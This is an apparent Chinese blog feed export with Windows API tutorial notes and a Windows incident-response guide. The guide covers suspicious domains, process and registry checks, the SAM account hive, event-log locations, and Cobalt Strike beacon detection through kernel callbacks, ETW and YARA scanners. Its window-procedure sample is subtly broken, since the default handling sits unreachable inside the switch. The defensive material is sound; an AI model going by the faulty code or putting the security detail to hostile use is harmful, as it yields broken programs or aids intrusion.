src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110685.png" alt="image-20211030173032737"></p><p><strong>主要是 考虑 缓冲区溢出问题</strong></p><p>需要添加头文件</p><pre class="line-numbers language-none"><code class="language-none">#include "strsafe.h"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110686.png" alt="image-20211030174026344"></p><h2 id="不要试图猜测文本的尺寸"><a href="#不要试图猜测文本的尺寸" class="headerlink" title="不要试图猜测文本的尺寸"></a>不要试图猜测文本的尺寸</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110687.png" alt="image-20211030174913656"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110688.png" alt="image-20211030175111104"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110689.png" alt="image-20211030174846812"></p><p><strong>注：不要使用固定的值</strong></p><p>应该使用：<code>GetTextMetrics</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110690.png" alt="image-20211030175248453"></p><h2 id="获取窗口的尺寸"><a href="#获取窗口的尺寸" class="headerlink" title="获取窗口的尺寸"></a>获取窗口的尺寸</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110691.png" alt="image-20211030175412829"></p><h2 id="设备独立性"><a href="#设备独立性" class="headerlink" title="设备独立性"></a>设备独立性</h2><p>简单来说，不用管用户 用的是什么物理设备</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110692.png" alt="image-20211030175443306"></p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);//主函数int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){    static TCHAR szAppName[] = TEXT("MyWindows");    HWND hwnd;    MSG msg;    WNDCLASS wndclass;    wndclass.style = CS_HREDRAW | CS_VREDRAW;    wndclass.lpfnWndProc = WndProc;    wndclass.cbClsExtra = 0;    wndclass.cbWndExtra = 0;    wndclass.hInstance = hInstance;    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);    wndclass.lpszMenuName = NULL;    wndclass.lpszClassName = szAppName;    if (!RegisterClass(&amp;wndclass))    {        MessageBox(NULL, TEXT("这个程序需要在Windows NT上才可以执行！"), szAppName, MB_ICONERROR);        return 0;    }    hwnd = CreateWindow(        szAppName,        TEXT("MyWindow"),        WS_OVERLAPPEDWINDOW,        CW_USEDEFAULT,        CW_USEDEFAULT,        CW_USEDEFAULT,        CW_USEDEFAULT,        NULL,        NULL,        hInstance,        NULL);    ShowWindow(hwnd, iCmdShow);    UpdateWindow(hwnd);    while (GetMessage(&amp;msg, NULL, 0, 0)) //GetMessage()从消息队列取出消息    {        TranslateMessage(&amp;msg); //将虚拟键消息转换为字符消息        DispatchMessage(&amp;msg); //将WM_AAA消息分配窗口过程MyWindowProc    }    return msg.wParam;}//自定义窗口过程LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam){       HDC hdc;    PAINTSTRUCT ps;    RECT rect;    switch (message)    {    case WM_PAINT:        hdc = BeginPaint(hwnd, &amp;ps);        GetClientRect(hwnd, &amp;rect);        DrawText(hdc, TEXT("MyWindows"), -1, &amp;rect,            DT_SINGLELINE | DT_CENTER | DT_VCENTER);        EndPaint(hwnd, &amp;ps);        return 0;    case WM_DESTROY:        PostQuitMessage(0);        return 0;     return DefWindowProcW(hwnd, message, wParam, lParam);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="滚动条"><a href="#滚动条" class="headerlink" title="滚动条"></a>滚动条</h2><h3 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h3><p>滚动条的出现最大限度的提高了用户的体验</p><h3 id="获得客户区的尺寸"><a href="#获得客户区的尺寸" class="headerlink" title="获得客户区的尺寸"></a>获得客户区的尺寸</h3><p>1.</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110693.png" alt="image-20211109211735831"></p><p>2.</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110694.png" alt="image-20211109211744346"></p><p>3.</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110695.png" alt="image-20211109211910830"></p><p>我们的重点是第三种</p><h3 id="WM-SIZE"><a href="#WM-SIZE" class="headerlink" title="WM_SIZE"></a>WM_SIZE</h3><h4 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h4><p> 当主窗口的客户区部分大小改变时，操作系统将给应用程序发送 WM_SIZE 消息，应用程序通过窗口过程接收该消息</p><h4 id="消息定义"><a href="#消息定义" class="headerlink" title="消息定义"></a>消息定义</h4><pre class="line-numbers language-none"><code class="language-none">#define WM_SIZE                         0x0005<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="参数解析-3"><a href="#参数解析-3" class="headerlink" title="参数解析"></a>参数解析</h4><pre class="line-numbers language-none"><code class="language-none">wParam:指出窗口的新状态*wParam:参数值参考如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th><strong>值</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>SIZE_MAXHIDE（4）</td><td>当该应用程序的其他窗口被最大化的时候，消息被发送往所有的弹出窗口</td></tr><tr><td>SIZE_MAXIMIZED（2）</td><td>该窗口被最大化</td></tr><tr><td>SIZE_MAXSHOW（3）</td><td>当该应用程序的其他窗口已经恢复到原来大小的时候，消息被发送往所有的弹出窗口</td></tr><tr><td>SIZE_MINIMIZED（1）</td><td>该窗口被最小化</td></tr><tr><td>SIZE_RESTORED（0）</td><td>该窗口的大小发生变化，但不是最大化（SIZE_MAXIMIZED）或最小化（MINIMIZED）</td></tr></tbody></table><h4 id="lParam"><a href="#lParam" class="headerlink" title="lParam"></a>lParam</h4><p>指出当前客户区的大小（宽度和高度）</p><pre class="line-numbers language-none"><code class="language-none">1. lParam 参数的低 16 位指定了新窗口的宽度2. lParam 参数的高 16 位制定了新窗口的高度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注：可以通过 <a href="http://bbs.fishc.com/thread-50382-1-1.html">LOWORD 宏</a>和 <a href="http://bbs.fishc.com/thread-50382-1-1.html">HIWORD 宏</a>来获取 lParam 参数的低 16 位和高 16 位。</p><h4 id="返回值-5"><a href="#返回值-5" class="headerlink" title="返回值"></a>返回值</h4><p> 如果窗口过程响应该消息，必须返回 0</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110696.png" alt="image-20211109213530591"></p><h2 id="添加滚动条"><a href="#添加滚动条" class="headerlink" title="添加滚动条"></a>添加滚动条</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110697.png" alt="image-20211110093610342"></p><h2 id="滚动条触发消息"><a href="#滚动条触发消息" class="headerlink" title="滚动条触发消息"></a>滚动条触发消息</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110698.png" alt="image-20211110093938996"></p><h2 id="Windows负责"><a href="#Windows负责" class="headerlink" title="Windows负责"></a>Windows负责</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110699.png" alt="image-20211110094924470"></p><h2 id="代码负责"><a href="#代码负责" class="headerlink" title="代码负责"></a>代码负责</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110700.png" alt="image-20211110095018532"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102110701.png" alt="image-20211110095038102"></p>]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows应急响应</title>
      <link href="/2021/10/28/windows-ying-ji-xiang-ying/"/>
      <url>/2021/10/28/windows-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows应急响应"><a href="#Windows应急响应" class="headerlink" title="Windows应急响应"></a>Windows应急响应</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，同时分析入侵原因、还原入侵过程、评估业务损失、溯源黑客取证并提出解决方案和防范措施，减少企业因黑客带来的相关损失，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p><h2 id="可疑域名后缀"><a href="#可疑域名后缀" class="headerlink" title="可疑域名后缀"></a>可疑域名后缀</h2><pre class="line-numbers language-none"><code class="language-none">.ru 俄罗斯 俄罗斯盛产黑客.ws 东萨摩亚不知名国家，易申请，难追踪注册者.cc 科科斯群岛 不知名国家，易申请，难追踪注册者.pw 帕劳 不知名国家，易申请，难追踪注册者.bz 伯利兹 不知名国家，易申请，难追踪注册者.su 苏联 前苏联虽然解体了，顶级域名还在使用，且多与黑产有关.bw 伯兹瓦纳不知名国家，易申请，难追踪注册者.gw 几内亚比绍 不知名国家，易申请，难追踪注册者.ms 蒙塞拉特岛 不知名国家，易申请，难追踪注册者.mz 莫桑比克不知名国家，易申请，难追踪注册者<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="整体分析流程"><a href="#整体分析流程" class="headerlink" title="整体分析流程"></a>整体分析流程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307134.png" alt="image-20211021093539377"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307302.png" alt="image-20211021093552522"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307735.png" alt="image-20211021093605547"></p><h2 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h2><h3 id="检查系统账号安全"><a href="#检查系统账号安全" class="headerlink" title="检查系统账号安全"></a>检查系统账号安全</h3><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><p>检查方法：据实际情况咨询相关服务器管理员。</p><p>2、查看服务器是否存在可疑账号、新增账号</p><p>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307043.png" alt="image-20211020133011674"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211309355.png" alt="image-20211020133030106"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307734.png" alt="image-20211020133044769"></p><p>3、查看服务器是否存在隐藏账号、克隆账号</p><p>检查方法：</p><p>a、Win+R，打开运行，输入<code>regedit</code>，打开注册表 ，查看管理员对应键值</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307146.png" alt="image-20211020133155810"></p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能</p><p>注：只提供Windows版本。</p><p>工具下载地址：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307900.png" alt="image-20211020133725038"></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><p>检查方法：</p><p>a、Win+R打开运行，输入<code>eventvwr.msc</code>，回车运行，打开”事件查看器”</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307939.png" alt="image-20211020133827696"></p><p>b、导出Windows日志–安全，利用Log Parser进行分析</p><p>工具下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307602.png" alt="image-20211020134439093"></p><h3 id="检查异常端口、进程"><a href="#检查异常端口、进程" class="headerlink" title="检查异常端口、进程"></a>检查异常端口、进程</h3><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><p>检查方法：</p><p>a、<code>netstat -ano</code> 查看目前的网络连接，定位可疑的端口，记录PID</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307668.png" alt="image-20211020134902155"></p><p>b、通过<code>tasklist</code>命令进行进程定位<code>tasklist | findstr "PID"</code></p><p>2、进程</p><p>检查方法：</p><p>a、Win+R打开运行，输入<code>msinfo32</code>，依次点击<code>软件环境--&gt;正在运行任务</code>就可以查看到进程的详细信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307465.png" alt="image-20211020135232478"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211307330.png" alt="image-20211020135215994"></p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308203.png" alt="image-20211020140219917"></p><p>c、通过微软官方提供的 Process Explorer工具进行排查 </p><p>工具下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer</a></p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre class="line-numbers language-none"><code class="language-none">没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU或内存资源占用长时间过高的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>e、杀死进程</p><pre class="line-numbers language-none"><code class="language-none">taskkill -PID 进程PID -F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、小技巧：</p><p>a、查看端口对应的PID： <code>netstat -ano | findstr "port"</code></p><p>b、查看进程对应的PID：<code>tasklist | findstr "PID"</code></p><p>c、查看进程对应的程序位置：</p><p>任务管理器–&gt;选择对应进程–&gt;右键打开文件位置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308806.png" alt="image-20211020141549231"></p><p>Win+R打开运行，输入<code>wmic</code>，输入<code>process</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308100.png" alt="image-20211020141507065"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308183.png" alt="image-20211020141414587"></p><p>d、<code>tasklist /svc </code> 打开进程–PID–服务</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308306.png" alt="image-20211020141626734"></p><p>e、查看Windows服务所对应的端口： <code>C:\Windows\system32\drivers\etc\services</code></p><h3 id="检查启动项、计划任务、服务"><a href="#检查启动项、计划任务、服务" class="headerlink" title="检查启动项、计划任务、服务"></a>检查启动项、计划任务、服务</h3><p>1、检查服务器是否有异常的启动项。</p><p>检查方法：</p><p>a、登录服务器，单击开始-&gt;程序-&gt;启动，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下</p><p>b、Win+R打开运行，输入 <code> msconfig</code>，查看是否存在命名异常的启动项目，是则取消</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308486.png" alt="image-20211020142541007"></p><p>勾选命名异常的启动项目，并到命令中显示的路径删除文件。 </p><p>c、Win+R打开运行，输入<code>regedit</code>，打开注册表</p><p>查看开机启动项是否正常，特别注意如下三个注册表项：</p><pre class="line-numbers language-none"><code class="language-none">HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\runHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检查右侧是否有启动异常的项目</p><p>d、利用安全软件，比如火绒剑查看启动项、开机时间管理等</p><p>2、检查计划任务</p><p>检查方法：</p><p>a、Win+R打开运行，输入<code>taskschd.msc</code>，查看计划任务属性，便可以发现木马文件的路径</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308744.png" alt="image-20211020144503015"></p><p>b、Win+R打开运行，输入 cmd，然后输入<code>schtasks.exe</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308710.png" alt="image-20211020144600689"></p><p>3、服务自启动</p><p>检查方法：</p><p>Win+R打开运行，输入<code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308877.png" alt="image-20211020144806333"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308680.png" alt="image-20211020144752707"></p><h3 id="检查系统相关信息"><a href="#检查系统相关信息" class="headerlink" title="检查系统相关信息"></a>检查系统相关信息</h3><p>1、查看系统版本以及补丁信息</p><p>检查方法：</p><p>Win+R打开运行，输入cmd，输入systeminfo，查看系统信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308322.png" alt="image-20211020144913064"></p><p>2、查找可疑目录及文件</p><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><pre class="line-numbers language-none"><code class="language-none">Window 2003：C:\Documents and SettingsWindow 2008R2：C:\Users\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>b、Win+R打开运行，输入<code>%UserProfifile%\Recent</code>，分析最近打开分析可疑文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308362.png" alt="image-20211020145028244"></p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p><h2 id="CobalStrike内核检测"><a href="#CobalStrike内核检测" class="headerlink" title="CobalStrike内核检测"></a>CobalStrike内核检测</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器</p><p>CobaltStrike服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><p>CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><p>在我们平常的应急响应中，都会有检测CobaltStrike的需求。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">1. 在内核通过PsSetLoadImageNotifyRoutine设置镜像加载通知回调，之后任何exe,dll的加载都会被检测。2. 而CobaltStrike使用sRDI方案，shellcode会调用LoadLibrary来加载需要dll，此时获取堆栈回溯3. 检测调用者的内存属性为是否为private，是否可写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><pre class="line-numbers language-none"><code class="language-none">1. 内核模块启动要先与CobaltStrike，如果已经运行则无法检测2. 在客户业务环境中内核模块要保证稳定性兼容性，还要解决数字签名等问题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CobaltStrike的特征分析"><a href="#CobaltStrike的特征分析" class="headerlink" title="CobaltStrike的特征分析"></a>CobaltStrike的特征分析</h3><p>综上所述，CobaltStrike的特征概述如下</p><pre class="line-numbers language-none"><code class="language-none">1. 对于http/https通信而言CobaltStrike均使用WinINet.dll来进行通信2. 无论选择exe/dll/raw等格式，CobaltStrike内存均会sRDI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="通过ETW记录WinINet日志"><a href="#通过ETW记录WinINet日志" class="headerlink" title="通过ETW记录WinINet日志"></a>通过ETW记录WinINet日志</h3><p>ETW可以记录WinINet的进程id、线程id、url、请求头、返回状态码、返回头等信息</p><p>在应急响应中，可以通过进程id、线程id、url进一步排查，进而阻断其网络和进程</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><pre class="line-numbers language-none"><code class="language-none">1.Win+R打开运行，输入eventvwr.msc，回车运行，打开"事件查看器"2.打开菜单查看-&gt;显示分析和调试日志3.进入应用程序和服务日志-&gt;Microsoft-&gt;Windows-&gt;WinINet(Microsoft-Windows-WinINet)4.UsageLog日志,右键属性,启用日志记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308086.png" alt="image-20211020163941024"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308611.png" alt="image-20211020163232328"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211308766.png" alt="image-20211020164016362"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211309654.png" alt="image-20211020171231935"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211309859.png" alt="image-20211020182742126"></p><p>我们刷新之后 开始分析UsageLog 的XML视图 可以更加直观一些</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211309053.png" alt="image-20211020182659180"></p><h2 id="CobalStrike特征码检测"><a href="#CobalStrike特征码检测" class="headerlink" title="CobalStrike特征码检测"></a>CobalStrike特征码检测</h2><pre class="line-numbers language-none"><code class="language-none">https://github.com/Apr4h/CobaltStrikeScanhttps://github.com/CCob/BeaconEyehttps://github.com/jas502n/cs_yara<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：通常使用yara规则去匹配内存或者文件,但缺点如不支持3.x、只支持http/https的beacon等</p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><h3 id="病毒动态："><a href="#病毒动态：" class="headerlink" title="病毒动态："></a>病毒动态：</h3><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h3 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h3><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>Processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h3 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h3><p>VT：<a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p><p>VirScan：<a href="https://www.virscan.org/">https://www.virscan.org/</a></p><p>Nodistribute：<a href="http://nodistribute.com/">http://nodistribute.com/</a></p><p>Hybrid-Analysis：<a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com/</a></p><p>魔盾安全分析：<a href="https://www.maldun.com/">https://www.maldun.com/</a></p><p>微步在线云沙箱：<a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com/">https://habo.qq.com/</a></p><p>奇安信威胁情报中心：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></p><p>大圣云沙箱检测：<a href="https://mac-cloud.riskivy.com/detect">https://mac-cloud.riskivy.com/detect</a></p><h3 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h3><p>D盾_Web查杀：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p><p>百度WEBDIR+(在线查杀地址)：<a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p><p>河马：<a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p><p>Web Shell Detector(在线查杀地址)：<a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a></p><p>Sangfor WebShellKill：<a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>PHP webshell查杀(在线查杀地址)：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me/</a></p><p>findWebshell：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>在线webshell查杀：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>安全日志中，记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么</p><p>对于我们应急响应时，更有帮助。</p><h3 id="事件日志"><a href="#事件日志" class="headerlink" title="事件日志"></a>事件日志</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>事件日志记录了 Windows操作系统在运行过程中发生的各种事信息</p><p>比如用户的登录或注销，远程桌面访问(RDP)，等等</p><h4 id="默认存储位置"><a href="#默认存储位置" class="headerlink" title="默认存储位置"></a>默认存储位置</h4><p><code>Windows NT/Win2000/XP/Server 2003</code>中， 日志文件的扩展名一直是<code>evt</code>，存储位置为</p><pre class="line-numbers language-none"><code class="language-none">%systemroot%\System32\config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Windows Vista和Windows Server 2008</code>之后，日志文件扩展名改为evtx (XML格式) ，存储位置改为</p><pre class="line-numbers language-none"><code class="language-none">%systemroot%\System32\WinEvt\logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>不同的EVENT ID代表了不同的意义</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211309187.png" alt="image-20211020222205887"></p><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211309594.png" alt="image-20211020222245432"></p><h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据。</p><h4 id="默认位置："><a href="#默认位置：" class="headerlink" title="默认位置："></a>默认位置：</h4><p><code>Windows NT/Win2000/XP/Server 2003</code>：</p><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\config\SysEvent.Evt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Windows Vista和Windows Server 2008</code>：</p><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\winevt\Logs\System.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="应用程序日志"><a href="#应用程序日志" class="headerlink" title="应用程序日志"></a>应用程序日志</h3><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件。</p><h4 id="默认位置：-1"><a href="#默认位置：-1" class="headerlink" title="默认位置："></a>默认位置：</h4><p><code>Windows NT/Win2000/XP/Server 2003</code>：</p><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\config\AppEvent.Evt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Windows Vista和Windows Server 2008</code>：</p><pre class="line-numbers language-none"><code class="language-none">C:\WINDOWS\system32\winevt\Logs\Application.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h3><h4 id="作用-3"><a href="#作用-3" 